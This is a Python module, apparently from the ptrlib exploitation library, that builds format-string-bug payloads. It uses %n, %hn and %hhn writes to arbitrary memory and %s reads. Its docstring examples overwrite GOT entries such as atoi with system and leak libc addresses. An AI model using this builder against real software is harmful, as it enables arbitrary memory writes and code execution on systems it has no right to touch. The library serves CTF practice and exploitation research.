"""This package provides some utilities for format string bug.
"""
from logging import getLogger
from typing import List, Literal, NamedTuple, Optional, Union
from ptrlib.types import PtrlibBitsT, PtrlibEndiannessT
from ptrlib.binary.encoding import str2bytes
from ptrlib.binary.packing import u32, p32, p64, flat

logger = getLogger(__name__)


class FSBOp(NamedTuple):
    """Representation of a single FSB operation
    """
    type: Literal['r', 'w', 'p']
    address: int = 0
    value: int = 0
    size: int = 0
    data: bytes = b''


class FSB:
    """FSB (format string bug) payload builder.

    Args:
        position (int): The argument index where the payload is located.
                        For example, if you feed "%p.%p.%p..." and get 0x70252e70252e7025
                        (="%p.%p.%p") at 7th (1-indexed), the position should be 7.
        bits (int): The bits of the target architecture. Must be either 32 or 64.
        byteorder (str): The endianness. Must be either 'little' or 'big'.
        written (int): The number of bytes already printed. This parameter is useful when
                       your payload is appended to a constant string by `strcat`,
                       or the address of the format string is not aligned.

    Examples:
        ```
        # Overwrite atoi@got with system@plt
        fsb = FSB(position=10, bits=32)
        fsb.write(elf.got('atoi'), p64(elf.plt('system')), size=2)
        sock.sendline(fsb.payload)
        ```

        ```
        # Partially overwrite exit@got and leak puts@libc
        fsb = FSB(6)
        fsb.write(elf.got('exit'), p8(elf.symbol('_start')))
        fsb.print('LEAK=')
        fsb.read(elf.got('puts'))
        sock.sendline(fsb.payload)
        libc.base = u64(sock.recvlineafter('LEAK=')[:6]) - libc.symbol('puts')
        ```
    """
    WRITE_PREFIX = {1: 'hhn', 2: 'hn', 4: 'n'}

    def __init__(self,
                 position: int,
                 bits: PtrlibBitsT = 64,
                 byteorder: PtrlibEndiannessT = 'little',
                 **kwargs: int):
        assert position >= 1, "Position must be a positive integer."

        self._ops: List[FSBOp] = []
        self.position = position
        self.written = kwargs.get('written', 0)
        self._rear = bits == 64
        self._bits = bits
        self._byteorder: PtrlibEndiannessT = byteorder

    @property
    def rear(self) -> bool:
        """Get rear flag.

        If this flag is set to True, the format string precedes the address list.
        """
        return self._rear

    @rear.setter
    def rear(self, flag: bool):
        if self._bits == 64 and not flag:
            raise ValueError("Address list cannot precede format string in 64-bit")
        self._rear = flag

    def read(self, address: int, written: int=0):
        """Read a NULL-terminated string.

        Args:
            address (int): The address of data to leak.
            written (int): The expected number of bytes to be printed.
                           You can skip this parameter if you're not using
                           `write` after this `read`.
        """
        self._ops.append(FSBOp('r', address, 0, written))

    def write(self, address: int, data: Union[str, bytes], block_size: Optional[int]=1):
        """Write data at a specific address.

        Args:
            address (int): The address to store the value.
            data (str or bytes): The data to write.
            block_size (int, optional): The number of bytes to split data into.
                                        Must be either 1 (%hhn), 2 (%hn), or 4 (%n).

        Examples:
            ```
            fsb = FSB(position=10)
            fsb.write(elf.got('atoi'), p64(elf.plt('system')), block_size=2)
            sock.sendline(fsb.payload)
            ```

            ```
            fsb = FSB(6)
            fsb.print(b"AAA")
            fsb.write(elf.got('exit'), p8(elf.symbol('_start') & 0xff))
            fsb.read(elf.got('puts'))
            sock.sendline(fsb.payload)
            ```
        """
        assert block_size in [1, 2, 4], "`block_size` must be either 1, 2, or 4"

        offset = 0
        while offset < len(data):
            value = u32(data[offset:offset+block_size], self._byteorder)
            self._ops.append(FSBOp('w', address + offset, value, block_size))
            offset += block_size

    def print(self, data: Union[str, bytes]):
        """Print data to the terminal.

        Args:
            data (str or bytes): The data to print.

        Examples:
            ```
            fsb = FSB(6)
            fsb.read(elf.got('atoi'))
            fsb.print("XXX")
            fsb.read(elf.got('system'))
            fsb.print("XXX")
            fsb.read(elf.got('abc'))
            ```
        """
        data = str2bytes(data)
        if b'\x00' in data:
            raise ValueError("NULL bytes cannot be printed in a format string")

        self._ops.append(FSBOp('p', data=data))

    def _format_string(self, position: int, written: int) -> bytes:
        """Craft a format string

        Args:
            position (int): The index of the payload in the stack.
            written (int): The number of bytes already written.
        """
        payload = b''
        for op in self._ops:
            if op.type == 'w':
                write_num = (op.value - written) % (1 << 8*op.size)
                if write_num == 0:
                    payload += f"%{position}${self.WRITE_PREFIX[op.size]}".encode()
                elif write_num == 1:
                    payload += f"%c%{position}${self.WRITE_PREFIX[op.size]}".encode()
                else:
                    payload += f"%{write_num}c%{position}${self.WRITE_PREFIX[op.size]}".encode()
                written = (written + write_num) % 0x1_0000_0000
                position += 1

            elif op.type == 'r':
                payload += f"%{position}$s".encode()
                written = (written + op.size) % 0x1_0000_0000
                position += 1

            else:
                payload += op.data
                written += len(op.data)

        return payload

    @property
    def payload(self) -> bytes:
        """Craft FSB payload.
        """
        payload = b''
        if self._bits == 32:
            bytesize, packer = 4, p32
        else:
            bytesize, packer = 8, p64

        if not self._rear:
            # Front mode
            payload += flat([op.address for op in self._ops if op.type != 'p'],
                            map=lambda addr: packer(addr, self._byteorder))

            if b'\0' in payload:
                logger.warning("'\\x00' found in the address list. Using rear mode as a fallback.")
            else:
                payload += self._format_string(self.position, self.written + len(payload))
                return payload

        # Guess the position of the address list
        guess_position = self.position
        while True:
            delta = guess_position - self.position
            fmtstr = self._format_string(guess_position, self.written)
            fmtstr += b'A' * ((delta * bytesize - len(fmtstr)) % bytesize)
            if guess_position >= self.position + len(fmtstr) // bytesize:
                break
            guess_position = self.position + len(fmtstr) // bytesize

        # Craft a format string
        delta = guess_position - self.position
        payload += self._format_string(guess_position, self.written)
        payload += b'A' * ((delta * bytesize - len(payload)) % bytesize)
        payload += flat([op.address for op in self._ops if op.type != 'p'],
                        map=lambda addr: packer(addr, self._byteorder))
        return payload

__all__ = ['FSB']
